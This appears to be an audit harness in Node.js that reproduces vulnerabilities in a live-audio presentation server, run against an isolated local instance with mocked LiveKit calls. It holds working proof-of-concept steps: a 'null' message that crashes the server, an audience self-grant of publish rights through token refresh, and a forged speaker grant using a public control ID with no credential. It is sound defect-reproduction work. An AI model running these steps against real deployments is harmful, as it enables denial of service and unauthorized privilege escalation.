// Isolated evidence harness. No application startup, operator data or real LiveKit calls.
// PASS means the reported defect was reproduced, not that the software is correct.
import assert from 'node:assert/strict';
import http from 'node:http';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { WebSocket } from 'ws';
import {
  createWsServer, getLiveAudioParticipantState, isLiveAudioControlAuthorized,
  getLiveAudioControlSnapshot,
} from '../../../server/ws-server.mjs';
import { createLiveKitApi } from '../../../server/livekit-server.mjs';
import { isProtectedRequestPath } from '../../../server/authUtils.mjs';

const mode = process.argv[2];
if (!mode) {
  for (const scenario of ['null-message', 'audience-self-grant', 'forged-moderation', 'reset-control']) {
    const result = spawnSync(process.execPath, [fileURLToPath(import.meta.url), scenario], {
      encoding: 'utf8', timeout: 10_000,
    });
    if (scenario === 'null-message') {
      assert.equal(result.status, 1);
      assert.match(result.stderr, /Cannot read properties of null/);
      console.log('PASS null-message: unauthenticated Audience terminates the isolated server process');
    } else {
      assert.equal(result.status, 0, result.stderr);
      assert.match(result.stdout, /PROOF/);
      console.log(`PASS ${scenario}: ${result.stdout.split('\n').find(line => line.startsWith('PROOF'))}`);
    }
  }
} else {
  Object.assign(process.env, {
    SEFER_REQUIRE_AUTH: 'true', SEFER_CONTROL_PASSWORD: 'audit-synthetic-password',
    SEFER_ALLOWED_ORIGINS: '', SEFER_SESSION_ACCESS_DEFAULT: 'PUBLIC',
    SEFER_LIVE_AUDIO_ENABLED: 'true', LIVEKIT_URL: 'wss://audit.invalid',
    LIVEKIT_API_KEY: 'audit-key', LIVEKIT_API_SECRET: 'audit-synthetic-secret',
  });
  const server = http.createServer();
  const wss = createWsServer(server, () => true);
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  const base = `ws://127.0.0.1:${server.address().port}/ws`;
  const sockets = [];
  const connect = async role => {
    const socket = new WebSocket(`${base}?role=${role}`, role === 'control' ? {
      headers: { authorization: `Basic ${Buffer.from('audit:audit-synthetic-password').toString('base64')}` },
    } : {});
    sockets.push(socket);
    const messages = [];
    socket.on('message', data => messages.push(JSON.parse(data.toString())));
    await new Promise((resolve, reject) => { socket.once('open', resolve); socket.once('error', reject); });
    const wait = async predicate => {
      for (let attempt = 0; attempt < 150; attempt++) {
        const found = messages.find(predicate);
        if (found) return found;
        await new Promise(resolve => setTimeout(resolve, 10));
      }
      throw new Error('Isolated message timeout');
    };
    return { socket, messages, wait };
  };
  const api = createLiveKitApi({
    getLiveAudioParticipantState, isLiveAudioControlAuthorized,
    getSessionAccessMode: () => 'PUBLIC',
  }, { roomServiceClient: { updateParticipant: async () => { updates++; } } });
  let updates = 0;
  const call = async (pathname, body) => {
    let result;
    await api.handle({
      req: { method: 'POST', headers: {} }, res: {}, url: new URL(pathname, 'http://audit.invalid'),
      readBody: async () => JSON.stringify(body),
      sendJson: (_res, status, value) => { result = { status, value }; },
    });
    return result;
  };
  const audience = await connect('audience');
  await audience.wait(message => message.type === 'WELCOME');
  if (mode === 'null-message') {
    audience.socket.send('null');
    await new Promise(resolve => setTimeout(resolve, 500));
    throw new Error('Expected isolated process termination');
  }
  if (mode === 'audience-self-grant') {
    const issued = await call('/api/livekit/token', { role: 'audience' });
    assert.equal(issued.status, 200);
    const decode = token => JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
    assert.equal(decode(issued.value.token).video.canPublish, false);
    audience.socket.send(JSON.stringify({ type: 'LIVE_AUDIO_PARTICIPANT_STATUS',
      participantId: issued.value.participantId, role: 'audience', speakerState: 'GRANTED',
      canSubscribe: true, canPublishAudio: true, isMuted: false, isActiveAudience: true,
    }));
    for (let i = 0; i < 100 && !getLiveAudioParticipantState(issued.value.participantId); i++) {
      await new Promise(resolve => setTimeout(resolve, 10));
    }
    const refreshed = await call('/api/livekit/refresh-token', {
      participantId: issued.value.participantId, refreshCredential: issued.value.refreshCredential,
    });
    assert.equal(refreshed.status, 200);
    assert.equal(decode(refreshed.value.token).video.canPublish, true);
    console.log('PROOF listener JWT canPublish=false becomes canPublish=true without any Control');
  }
  if (mode === 'forged-moderation') {
    const control = await connect('control');
    const welcome = await control.wait(message => message.type === 'WELCOME');
    control.socket.send(JSON.stringify({ type: 'LIVE_AUDIO_CONTROL_PUBLIC_KEY',
      controlSessionId: welcome.controlSessionId, keyId: 'audit-key-id', publicKey: 'AQ==',
    }));
    const publicKey = await audience.wait(message => message.type === 'LIVE_AUDIO_CONTROL_PUBLIC_KEY');
    const issued = await call('/api/livekit/token', { role: 'audience' });
    assert.equal(isProtectedRequestPath('/api/livekit/grant-speak', 'POST'), false);
    const forged = await call('/api/livekit/grant-speak', {
      role: 'control', controlSessionId: publicKey.controlSessionId, participantId: issued.value.participantId,
    });
    assert.equal(forged.status, 200);
    assert.equal(updates, 1);
    console.log('PROOF no Basic credential: public Control ID authorizes the mocked SFU permission update');
  }
  if (mode === 'reset-control') {
    const control = await connect('control');
    const welcome = await control.wait(message => message.type === 'WELCOME');
    assert.equal(isLiveAudioControlAuthorized(welcome.controlSessionId), true);
    control.socket.send(JSON.stringify({ type: 'REMOTE_COMMAND', clientId: 'audit-control',
      payload: { command: 'RESET_STATE', clearSession: true, hardRefresh: false },
    }));
    await control.wait(message => message.type === 'PRESENTATION_SESSION_ROTATED');
    assert.equal(isLiveAudioControlAuthorized(welcome.controlSessionId), false);
    assert.equal(getLiveAudioControlSnapshot().controls.length, 0);
    control.socket.send(JSON.stringify({ type: 'REMOTE_COMMAND', clientId: 'audit-control',
      payload: { command: 'NEXT_SLIDE' },
    }));
    await control.wait(message => message.type === 'ERROR' && message.code === 'CONTROL_PENDING_FORBIDDEN');
    console.log('PROOF soft session reset keeps socket open but removes its authority; next command is rejected');
  }
  api.close();
  for (const socket of sockets) socket.terminate();
  await new Promise(resolve => wss.close(resolve));
  await new Promise(resolve => server.close(resolve));
}
